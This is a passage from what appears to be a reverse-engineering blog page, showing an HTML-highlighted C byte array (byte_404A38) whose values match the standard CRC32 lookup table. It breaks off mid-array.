byte_404A38[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x96</span>, <span class="number">0x30</span>, <span class="number">0x07</span>, <span class="number">0x77</span>, <span class="number">0x2C</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0xEE</span>, <span class="number">0xBA</span>, <span class="number">0x51</span>, <span class="number">0x09</span>, <span class="number">0x99</span>, <span class="number">0x19</span>, <span class="number">0xC4</span>, <span class="number">0x6D</span>, <span class="number">0x07</span>,</span><br><span class="line">  <span class="number">0x8F</span>, <span class="number">0xF4</span>, <span class="number">0x6A</span>, <span class="number">0x70</span>, <span class="number">0x35</span>, <span class="number">0xA5</span>, <span class="number">0x63</span>, <span class="number">0xE9</span>, <span class="number">0xA3</span>, <span class="number">0x95</span>,</span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x9E</span>, <span class="number">0x32</span>, <span class="number">0x88</span>, <span class="number">0xDB</span>, <span class="number">0x0E</span>, <span class="number">0xA4</span>, <span class="number">0xB8</span>, <span class="number">0xDC</span>, <span class="number">0x79</span>,</span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0xE9</span>, <span class="number">0xD5</span>, <span class="number">0xE0</span>, <span class="number">0x88</span>, <span class="number">0xD9</span>, <span class="number">0xD2</span>, <span class="number">0x97</span>, <span class="number">0x2B</span>, <span class="number">0x4C</span>,</span><br><span class="line">  <span class="number">0xB6</span>, <span class="number">0x09</span>, <span class="number">0xBD</span>, <span class="number">0x7C</span>, <span class="number">0xB1</span>, <span class="number">0x7E</span>, <span class="number">0x07</span>, <span class="number">0x2D</span>, <span class="number">0xB8</span>, <span class="number">0xE7</span>,</span><br><span class="line">  <span class="number">0x91</span>, <span class="number">0x1D</span>, <span class="number">0xBF</span>, <span class="number">0x90</span>, <span class="number">0x64</span>, <span class="number">0x10</span>, <span class="number">0xB7</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x20</span>,</span><br><span class="line">  <span class="number">0xB0</span>, <span class="number">0x6A</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0xB9</span>, <span class="number">0xF3</span>, <span class="number">0xDE</span>, <span class="number">0x41</span>, <span class="number">0xBE</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0xD4</span>, <span class="number">0xDA</span>, <span class="number">0x1A</span>, <span class="number">0xEB</span>, <span class="number">0xE4</span>, <span class="number">0xDD</span>, <span class="number">0x6D</span>, <span class="number">0x51</span>, <span class="number">0xB5</span>,</span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0xF4</span>, <span class="number">0xC7</span>, <span class="number">0x85</span>, <span class="number">0xD3</span>, <span class="number">0x83</span>, <span class="number">0x56</span>, <span class="number">0x98</span>, <span class="number">0x6C</span>, <span class="number">0x13</span>,</span><br><span class="line">  <span class="number">0xC0</span>, <span class="number">0xA8</span>, <span class="number">0x6B</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>, <span class="number">0xF9</span>, <span class="number">0x62</span>, <span class="number">0xFD</span>, <span class="number">0xEC</span>, <span class="number">0xC9</span>,</span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x8A</span>, <span class="number">0x4F</span>, <span class="number">0x5C</span>, <span class="number">0x01</span>, <span class="number">0x14</span>, <span class="number">0xD9</span>, <span class="number">0x6C</span>, <span class="number">0x06</span>, <span class="number">0x63</span>,</span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x3D</span>, <span class="number">0x0F</span>, <span class="number">0xFA</span>, <span class="number">0xF5</span>, <span class="number">0x0D</span>, <span class="number">0x08</span>, <span class="number">0x8D</span>, <span class="number">0xC8</span>, <span class="number">0x20</span>,</span><br><span class="line">  <span class="number">0x6E</span>, <span class="number">0x3B</span>, <span class="number">0x5E</span>, <span class="number">0x10</span>, <span class="number">0x69</span>, <span class="number">0x4C</span>, <span class="number">0xE4</span>, <span class="number">0x41</span>, <span class="number">0x60</span>, <span class="number">0xD5</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x67</span>, <span class="number">0xA2</span>, <span class="number">0xD1</span>, <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x3C</span>, <span class="number">0x47</span>, <span class="number">0xD4</span>,</span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x4B</span>, <span class="number">0xFD</span>, <span class="number">0x85</span>, <span class="number">0x0D</span>, <span class="number">0xD2</span>, <span class="number">0x6B</span>, <span class="number">0xB5</span>, <span class="number">0x0A</span>, <span class="number">0xA5</span>,</span><br><span class="line">  <span class="number">0xFA</span>, <span class="number">0xA8</span>, <span class="number">0xB5</span>, <span class="number">0x35</span>, <span class="number">0x6C</span>, <span class="number">0x98</span>, <span class="number">0xB2</span>, <span class="number">0x42</span>, <span class="number">0xD6</span>, <span class="number">0xC9</span>,</span><br><span class="line">  <span class="number">0xBB</span>, <span class="number">0xDB</span>, <span class="number">0x40</span>, <span class="number">0xF9</span>, <span class="number">0xBC</span>, <span class="number">0xAC</span>, <span class="number">0xE3</span>, <span class="number">0x6C</span>, <span class="number">0xD8</span>, <span class="number">0x32</span>,</span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x5C</span>, <span class="number">0xDF</span>, <span class="number">0x45</span>, <span class="number">0xCF</span>, <span class="number">0x0D</span>, <span class="number">0xD6</span>, <span class="number">0xDC</span>, <span class="number">0x59</span>, <span class="number">0x3D</span>,</span><br><span class="line">  <span class="number">0xD1</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0x30</span>, <span class="number">0xD9</span>, <span class="number">0x26</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0xDE</span>, <span class="number">0x51</span>,</span><br><span class="line">  <span class="number">0x80</span>, <span class="number">0x51</span>, <span class="number">0xD7</span>, <span class="number">0xC8</span>, <span class="number">0x16</span>, <span class="number">0x61</span>, <span class="number">0xD0</span>, <span class="number">0xBF</span>, <span class="number">0xB5</span>, <span class="number">0xF4</span>,</span><br><span class="line">  <span class="number">0xB4</span>, <span class="number">0x21</span>, <span class="number">0x23</span>, <span class="number">0xC4</span>, <span class="number">0xB3</span>, <span class="number">0x56</span>, <span class="number">0x99</span>, <span class="number">0x95</span>, <span class="number">0xBA</span>, <span class="number">0xCF</span>,</span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0xA5</span>, <span class="number">0xBD</span>, <span class="number">0xB8</span>, <span class="number">0x9E</span>, <span class="number">0xB8</span>, <span class="number">0x02</span>, <span class="number">0x28</span>, <span class="number">0x08</span>, <span class="number">0x88</span>,</span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x5F</span>, <span class="number">0xB2</span>, <span class="number">0xD9</span>, <span class="number">0x0C</span>, <span class="number">0xC6</span>, <span class="number">0x24</span>, <span class="number">0xE9</span>, <span class="number">0x0B</span>, <span class="number">0xB1</span>,</span><br><span class="line">  <span class="number">0x87</span>, <span class="number">0x7C</span>, <span class="number">0x6F</span>, <span class="number">0x2F</span>, <span class="number">0x11</span>, <span class="number">0x4C</span>, <span class="number">0x68</span>, <span class="number">0x58</span>, <span class="number">0xAB</span>, <span class="number">0x1D</span>,</span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0xC1</span>, <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0x66</span>, <span class="number">0xB6</span>, <span class="number">0x90</span>, <span class="number">0x41</span>, <span class="number">0xDC</span>, <span class="number">0x76</span>,</span><br><span class="line">  <span class="number">0x06</span>, <span class="number">0x71</span>, <span class="number">0xDB</span>, <span class="number">0x01</span>, <span class="number">0xBC</span>, <span class="number">0x20</span>, <span class="number">0xD2</span>, <span class="number">0x98</span>, <span class="number">0x2A</span>, <span class="number">0x10</span>,</span><br><span class="line">  <span class="number">0xD5</span>, <span class="number">0xEF</span>, <span class="number">0x89</span>, <span class="number">0x85</span>, <span class="number">0xB1</span>, <span class="number">0x71</span>, <span class="number">0x1F</span>, <span class="number">0xB5</span>, <span class="number">0xB6</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0xA5</span>, <span class="number">0xE4</span>, <span class="number">0xBF</span>, <span class="number">0x9F</span>, <span class="number">0x33</span>, <span class="number">0xD4</span>, <span class="number">0xB8</span>, <span class="number">0xE8</span>, <span class="number">0xA2</span>, <span class="number">0xC9</span>,</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x78</span>, <span class="number">0x34</span>, <span class="number">0xF9</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x8E</span>, <span class="number">0xA8</span>, <span class="number">0x09</span>, <span class="number">0x96</span>,</span><br><span class="line">  <span class="number">0x18</span>, <span class="number">0x98</span>, <span class="number">0x0E</span>, <span class="number">0xE1</span>, <span class="number">0xBB</span>, <span class="number">0x0D</span>, <span class="number">0x6A</span>, <span class="number">0x7F</span>, <span class="number">0x2D</span>, <span class="number">0x3D</span>,</span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0x08</span>, <span class="number">0x97</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x91</span>, <span class="number">0x01</span>, <span class="number">0x5C</span>, <span class="number">0x63</span>, <span class="number">0xE6</span>,</span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x51</span>, <span class="number">0x6B</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x1C</span>, <span class="number">0xD8</span>, <span class="number">0x30</span>,</span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x85</span>, <span class="number">0x4E</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0xF2</span>, <span class="number">0xED</span>, <span class="number">0x95</span>, <span class="number">0x06</span>, <span class="number">0x6C</span>,</span><br><span class="line">  <span class="number">0x7B</span>, <span class="number">0xA5</span>, <span class="number">0x01</span>, <span class="number">0x1B</span>, <span class="number">0xC1</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, <span class="number">0x82</span>, <span class="number">0x57</span>, <span class="number">0xC4</span>,</span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0xF5</span>, <span class="number">0xC6</span>, <span class="number">0xD9</span>, <span class="number">0xB0</span>, <span class="number">0x65</span>, <span class="number">0x50</span>, <span class="number">0xE9</span>, <span class="number">0xB7</span>, <span class="number">0x12</span>,</span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0xB8</span>, <span class="number">0xBE</span>, <span class="number">0x8B</span>, <span class="number">0x7C</span>, <span class="number">0x88</span>, <span class="number">0xB9</span>, <span class="number">0xFC</span>, <span class="number">0xDF</span>, <span class="number">0x1D</span>,</span><br><span class="line">  <span class="number">0xDD</span>, <span class="number">0x62</span>, <span class="number">0x49</span>, <span class="number">0x2D</span>, <span class="number">0xDA</span>, <span class="number">0x15</span>, <span class="number">0xF3</span>, <span class="number">0x7C</span>, <span class="number">0xD3</span>, <span class="number">0x8C</span>,</span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x4C</span>, <span class="number">0xD4</span>, <span class="number">0xFB</span>, <span class="number">0x58</span>, <span class="number">0x61</span>, <span class="number">0xB2</span>, <span class="number">0x4D</span>, <span class="number">0xCE</span>, <span class="number">0x51</span>,</span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x3A</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0xBC</span>, <span class="number">0xA3</span>, <span class="number">0xE2</span>, <span class="number">0x30</span>, <span class="number">0xBB</span>, <span class="number">0xD4</span>,</span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0xA5</span>, <span class="number">0xDF</span>, <span class="number">0x4A</span>, <span class="number">0xD7</span>, <span class="number">0x95</span>, <span class="number">0xD8</span>, <span class="number">0x3D</span>, <span class="number">0x6D</span>, <span class="number">0xC4</span>,</span><br><span class="line">  <span class="number">0xD1</span>, <span class="number">0xA4</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0xD6</span>, <span class="number">0xD3</span>, <span class="number">0x6A</span>, <span class="number">0xE9</span>, <span class="number">0x69</span>, <span class="number">0x43</span>,</span><br><span class="line">  <span class="number">0xFC</span>, <span class="number">0xD9</span>, <span class="number">0x6E</span>, <span class="number">0x34</span>, <span class="number">0x46</span>, <span class="number">0x88</span>, <span class="number">0x67</span>, <span class="number">0xAD</span>, <span class="number">0xD0</span>, <span class="number">0xB8</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0xDA</span>, <span class="number">0x73</span>, <span class="number">0x2D</span>, <span class="number">0x04</span>, <span class="number">0x44</span>, <span class="number">0xE5</span>, <span class="number">0x1D</span>, <span class="number">0x03</span>, <span class="number">0x33</span>,</span><br><span class="line">  <span class="number">0x5F</span>, <span class="number">0x4C</span>, <span class="number">0x0A</span>, <span class="number">0xAA</span>, <span class="number">0xC9</span>, <span class="number">0x7C</span>, <span class="number">0x0D</span>, <span class="number">0xDD</span>, <span class="number">0x3C</span>, <span class="number">0x71</span>,</span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x50</span>, <span class="number">0xAA</span>, <span class="number">0x41</span>, <span class="number">0x02</span>, <span class="number">0x27</span>, <span class="number">0x10</span>, <span class="number">0x10</span>, <span class="number">0x0B</span>, <span class="number">0xBE</span>,</span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0x20</span>, <span class="number">0x0C</span>, <span class="number">0xC9</span>, <span class="number">0x25</span>, <span class="number">0xB5</span>, <span class="number">0x68</span>, <span class="number">0x57</span>, <span class="number">0xB3</span>, <span class="number">0x85</span>,</span><br><span class="line">  <span class="number">0x6F</span>, <span class="number">0x20</span>, <span class="number">0x09</span>, <span class="number">0xD4</span>, <span class="number">0x66</span>, <span class="number">0xB9</span>, <span class="number">0x9F</span>, <span class="number">0xE4</span>, <span class="number">0x61</span>, <span class="number">0xCE</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0xF9</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x98</span>, <span class="number">0xC9</span>, <span class="number">0xD9</span>, <span class="number">0x29</span>, <span class="number">0x22</span>, <span class="number">0x98</span>,</span><br><span class="line">  <span class="number">0xD0</span>, <span class="number">0xB0</span>, <span class="number">0xB4</span>, <span class="number">0xA8</span>, <span class="number">0xD7</span>, <span class="number">0xC7</span>, <span class="number">0x17</span>, <span class="number">0x3D</span>, <span class="number">0xB3</span>, <span class="number">0x59</span>,</span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x0D</span>, <span class="number">0xB4</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x5C</span>, <span class="number">0xBD</span>, <span class="number">0xB7</span>, <span class="number">0xAD</span>, <span class="number">0x6C</span>,</span><br><span class="line">  <span class="number">0xBA</span>, <span class="number">0xC0</span>, <span class="number">0x20</span>, <span class="number">0x83</span>, <span class="number">0xB8</span>, <span class="number">0xED</span>, <span class="number">0xB6</span>, <span class="number">0xB3</span>, <span class="number">0xBF</span>, <span class="number">0x9A</span>,</span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0xE2</span>, <span class="number">0xB6</span>, <span class="number">0x03</span>, <span class="number">0x9A</span>, <span class="number">0xD2</span>, <span class="number">0xB1</span>, <span class="number">0x74</span>, <span class="number">0x39</span>, <span class="number">0x47</span>,</span><br><span class="line">  <span class="number">0xD5</span>, <span class="number">0xEA</span>, <span class="number">0xAF</span>, <span class="number">0x77</span>, <span class="number">0xD2</span>, <span class="number">0x9D</span>, <span class="number">0x15</span>, <span class="number">0x26</span>, <span class="number">0xDB</span>, <span class="number">0x04</span>,</span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0x16</span>, <span class="number">0xDC</span>, <span class="number">0x73</span>, <span class="number">0x12</span>, <span class="number">0x0B</span>, <span class="number">0x63</span>, <span class="number">0xE3</span>, <span class="number">0x84</span>, <span class="number">0x3B</span>,</span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x94</span>, <span class="number">0x3E</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x0D</span>, <span class="number">0xA8</span>, <span class="number">0x5A</span>, <span class="number">0x6A</span>, <span class="number">0x7A</span>,</span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0xCF</span>, <span class="number">0x0E</span>, <span class="number">0xE4</span>, <span class="number">0x9D</span>, <span class="number">0xFF</span>, <span class="number">0x09</span>, <span class="number">0x93</span>, <span class="number">0x27</span>, <span class="number">0xAE</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0xB1</span>, <span class="number">0x9E</span>, <span class="number">0x07</span>, <span class="number">0x7D</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x0F</span>, <span class="number">0xF0</span>,</span><br><span class="line">  <span class="number">0xD2</span>, <span class="number">0xA3</span>, <span class="number">0x08</span>, <span class="number">0x87</span>, <span class="number">0x68</span>, <span class="number">0xF2</span>, <span class="number">0x01</span>, <span class="number">0x1E</span>, <span class="number">0xFE</span>, <span class="number">0xC2</span>,</span><br><span class="line">  <span class="number">0x06</span>, <span class="number">0x69</span>, <span class="number">0x5D</span>, <span class="number">0x57</span>, <span class="number">0x62</span>, <span class="number">0xF7</span>, <span class="number">0xCB</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x80</span>,</span><br><span class="line">  <span class="number">0x71</span>, <span class="number">0x36</span>, <span class="number">0x6C</span>, <span class="number">0x19</span>, <span class="number">0xE7</span>, <span class="number">0x06</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x76</span>, <span class="number">0x1B</span>,</span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0xFE</span>, <span class="number">0xE0</span>, <span class="number">0x2B</span>, <span class="number">0xD3</span>, <span class="number">0x89</span>, <span class="number">0x5A</span>, <span class="number">0x7A</span>, <span class="number">0xDA</span>, <span class="number">0x10</span>,</span><br><span class="line">  <span class="number">0xCC</span>, <span class="number">0x4A</span>, <span class="number">0xDD</span>, <span class="number">0x67</span>, <span class="number">0x6F</span>, <span class="number">0xDF</span>, <span class="number">0xB9</span>, <span class="number">0xF9</span>, <span class="number">0xF9</span>, <span class="number">0xEF</span>,</span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0xBE</span>, <span class="number">0xB7</span>, <span class="number">0x17</span>, <span class="number">0xD5</span>, <span class="number">0x8E</span>, <span class="number">0xB0</span>, <span class="number">0x60</span>,</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xA3</span>, <span class="number">0xD6</span>, <span class="number">0xD6</span>, <span class="number">0x7E</span>, <span class="number">0x93</span>, <span class="number">0xD1</span>, <span class="number">0xA1</span>, <span class="number">0xC4</span>, <span class="number">0xC2</span>,</span><br><span class="line">  <span class="number">0xD8</span>, <span class="number">0x38</span>, <span class="number">0x52</span>, <span class="number">0xF2</span>, <span class="number">0xDF</span>, <span class="number">0x4F</span>, <span class="number">0xF1</span>, <span class="number">0x67</span>, <span class="number">0xBB</span>, <span class="number">0xD1</span>,</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x57</span>, <span class="number">0xBC</span>, <span class="number">0xA6</span>, <span class="number">0xDD</span>, <span class="number">0x06</span>, <span class="number">0xB5</span>, <span class="number">0x3F</span>, <span class="number">0x4B</span>, <span class="number">0x36</span>,</span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x48</span>, <span class="number">0xDA</span>, <span class="number">0x2B</span>, <span class="number">0x0D</span>, <span class="number">0xD8</span>, <span class="number">0x4C</span>, <span class="number">0x1B</span>, <span class="number">0x0A</span>, <span class="number">0xAF</span>,</span><br><span class="line">  <span class="number">0xF6</span>, <span class="number">0x4A</span>, <span class="number">0x03</span>, <span class="number">0x36</span>, <span class="number">0x60</span>, <span class="number">0x7A</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0xC3</span>, <span class="number">0xEF</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0xDF</span>, <span class="number">0x55</span>, <span class="number">0xDF</span>, <span class="number">0x67</span>, <span class="number">0xA8</span>, <span class="number">0xEF</span>, <span class="number">0x8E</span>, <span class="number">0x6E</span>, <span class="number">0x31</span>,</span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0xBE</span>, <span class="number">0x69</span>, <span class="number">0x46</span>, <span class="number">0x8C</span>, <span class="number">0xB3</span>, <span class="number">0x61</span>, <span class="number">0xCB</span>, <span class="number">0x1A</span>, <span class="number">0x83</span>,</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0xBC</span>, <span class="number">0xA0</span>, <span class="number">0xD2</span>, <span class="number">0x6F</span>, <span class="number">0x25</span>, <span class="number">0x36</span>, <span class="number">0xE2</span>, <span class="number">0x68</span>, <span class="number">0x52</span>,</span><br><span class="line">  <span class="number">0x95</span>, <span class="number">0x77</span>, <span class="number">0x0C</span>, <span class="number">0xCC</span>, <span class="number">0x03</span>, <span class="number">0x47</span>, <span class="number">0x0B</span>, <span class="number">0xBB</span>, <span class="number">0xB9</span>, <span class="number">0x16</span>,</span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x22</span>, <span class="number">0x2F</span>, <span class="number">0x26</span>, <span class="number">0x05</span>, <span class="number">0x55</span>, <span class="number">0xBE</span>, <span class="number">0x3B</span>, <span class="number">0xBA</span>, <span class="number">0xC5</span>,</span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x0B</span>, <span class="number">0xBD</span>, <span class="number">0xB2</span>, <span class="number">0x92</span>, <span class="number">0x5A</span>, <span class="number">0xB4</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x6A</span>,</span><br><span class="line">  <span class="number">0xB3</span>, <span class="number">0x5C</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0x31</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xB5</span>,</span><br><span class="line">  <span class="number">0x8B</span>, <span class="number">0x9E</span>, <span class="number">0xD9</span>, <span class="number">0x2C</span>, <span class="number">0x1D</span>, <span class="number">0xAE</span>, <span class="number">0xDE</span>, <span class="number">0x5B</span>, <span class="number">0xB0</span>, <span class="number">0xC2</span>,</span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x9B</span>, <span class="number">0x26</span>, <span class="number">0xF2</span>, <span class="number">0x63</span>, <span class="number">0xEC</span>, <span class="number">0x9C</span>, <span class="number">0xA3</span>, <span class="number">0x6A</span>, <span class="number">0x75</span>,</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x93</span>, <span class="number">0x6D</span>, <span class="number">0x02</span>, <span class="number">0xA9</span>, <span class="number">0x06</span>, <span class="number">0x09</span>, <span class="number">0x9C</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0xEB</span>, <span class="number">0x85</span>, <span class="number">0x67</span>, <span class="number">0x07</span>, <span class="number">0x72</span>, <span class="number">0x13</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x05</span>,</span><br><span class="line">  <span class="number">0x82</span>, <span class="number">0x4A</span>, <span class="number">0xBF</span>, <span class="number">0x95</span>, <span class="number">0x14</span>, <span class="number">0x7A</span>, <span class="number">0xB8</span>, <span class="number">0xE2</span>, <span class="number">0xAE</span>, <span class="number">0x2B</span>,</span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x7B</span>, <span class="number">0x38</span>, <span class="number">0x1B</span>, <span class="number">0xB6</span>, <span class="number">0x0C</span>, <span class="number">0x9B</span>, <span class="number">0x8E</span>, <span class="number">0xD2</span>, <span class="number">0x92</span>,</span><br><span class="line">  <span class="number">0x0D</span>, <span class="number">0xBE</span>, <span class="number">0xD5</span>, <span class="number">0xE5</span>, <span class="number">0xB7</span>, <span class="number">0xEF</span>, <span class="number">0xDC</span>, <span class="number">0x7C</span>, <span class="number">0x21</span>, <span class="number">0xDF</span>,</span><br><span class="line">  <span class="number">0xDB</span>, <span class="number">0x0B</span>, <span class="number">0xD4</span>, <span class="number">0xD2</span>, <span class="number">0xD3</span>, <span class="number">0x86</span>, <span class="number">0x42</span>, <span class="number">0xE2</span>, <span class="number">0xD4</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xB3</span>, <span class="number">0xDD</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>, <span class="number">0x83</span>, <span class="number">0xDA</span>, <span class="number">0x1F</span>, <span class="number">0xCD</span>, <span class="number">0x16</span>,</span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0x81</span>, <span class="number">0x5B</span>, <span class="number">0x26</span>, <span class="number">0xB9</span>, <span class="number">0xF6</span>, <span class="number">0xE1</span>, <span class="number">0x77</span>, <span class="number">0xB0</span>, <span class="number">0x6F</span>,</span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x47</span>, <span class="number">0xB7</span>, <span class="number">0x18</span>, <span class="number">0xE6</span>, <span class="number">0x5A</span>, <span class="number">0x08</span>, <span class="number">0x88</span>, <span class="number">0x70</span>, <span class="number">0x6A</span>,</span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0xFF</span>, <span class="number">0xCA</span>, <span class="number">0x3B</span>, <span class="number">0x06</span>, <span class="number">0x66</span>, <span class="number">0x5C</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0x11</span>,</span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x9E</span>, <span class="number">0x65</span>, <span class="number">0x8F</span>, <span class="number">0x69</span>, <span class="number">0xAE</span>, <span class="number">0x62</span>, <span class="number">0xF8</span>, <span class="number">0xD3</span>, <span class="number">0xFF</span>,</span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x61</span>, <span class="number">0x45</span>, <span class="number">0xCF</span>, <span class="number">0x6C</span>, <span class="number">0x16</span>, <span class="number">0x78</span>, <span class="number">0xE2</span>, <span class="number">0x0A</span>, <span class="number">0xA0</span>,</span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0xD2</span>, <span class="number">0x0D</span>, <span class="number">0xD7</span>, <span class="number">0x54</span>, <span class="number">0x83</span>, <span class="number">0x04</span>, <span class="number">0x4E</span>, <span class="number">0xC2</span>, <span class="number">0xB3</span>,</span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x39</span>, <span class="number">0x61</span>, <span class="number">0x26</span>, <span class="number">0x67</span>, <span class="number">0xA7</span>, <span class="number">0xF7</span>, <span class="number">0x16</span>, <span class="number">0x60</span>, <span class="number">0xD0</span>,</span><br><span class="line">  <span class="number">0x4D</span>, <span class="number">0x47</span>, <span class="number">0x69</span>, <span class="number">0x49</span>, <span class="number">0xDB</span>, <span class="number">0x77</span>, <span class="number">0x6E</span>, <span class="number">0x3E</span>, <span class="number">0x4A</span>, <span class="number">0x6A</span>,</span><br><span class="line">  <span class="number">0xD1</span>, <span class="number">0xAE</span>, <span class="number">0xDC</span>, <span class="number">0x5A</span>, <span class="number">0xD6</span>, <span class="number">0xD9</span>, <span class="number">0x66</span>, <span class="number">0x0B</span>, <span class="number">0xDF</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0x3B</span>, <span class="number">0xD8</span>, <span class="number">0x37</span>, <span class="number">0x53</span>, <span class="number">0xAE</span>, <span class="number">0xBC</span>, <span class="number">0xA9</span>, <span class="number">0xC5</span>, <span class="number">0x9E</span>,</span><br><span class="line">  <span class="number">0xBB</span>, <span class="number">0xDE</span>, <span class="number">0x7F</span>, <span class="number">0xCF</span>, <span class="number">0xB2</span>, <span class="number">0x47</span>, <span class="number">0xE9</span>, <span class="number">0xFF</span>, <span class="number">0xB5</span>, <span class="number">0x30</span>,</span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0xF2</span>, <span class="number">0xBD</span>, <span class="number">0xBD</span>, <span class="number">0x8A</span>, <span class="number">0xC2</span>, <span class="number">0xBA</span>, <span class="number">0xCA</span>, <span class="number">0x30</span>, <span class="number">0x93</span>,</span><br><span class="line">  <span class="number">0xB3</span>, <span class="number">0x53</span>, <span class="number">0xA6</span>, <span class="number">0xA3</span>, <span class="number">0xB4</span>, <span class="number">0x24</span>, <span class="number">0x05</span>, <span class="number">0x36</span>, <span class="number">0xD0</span>, <span class="number">0xBA</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x06</span>, <span class="number">0xD7</span>, <span class="number">0xCD</span>, <span class="number">0x29</span>, <span class="number">0x57</span>, <span class="number">0xDE</span>, <span class="number">0x54</span>, <span class="number">0xBF</span>, <span class="number">0x67</span>,</span><br><span class="line">  <span class="number">0xD9</span>, <span class="number">0x23</span>, <span class="number">0x2E</span>, <span class="number">0x7A</span>, <span class="number">0x66</span>, <span class="number">0xB3</span>, <span class="number">0xB8</span>, <span class="number">0x4A</span>, <span class="number">0x61</span>, <span class="number">0xC4</span>,</span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x94</span>, <span class="number">0x2B</span>, <span class="number">0x6F</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0xBE</span>,</span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0xB4</span>, <span class="number">0xA1</span>, <span class="number">0x8E</span>, <span class="number">0x0C</span>, <span 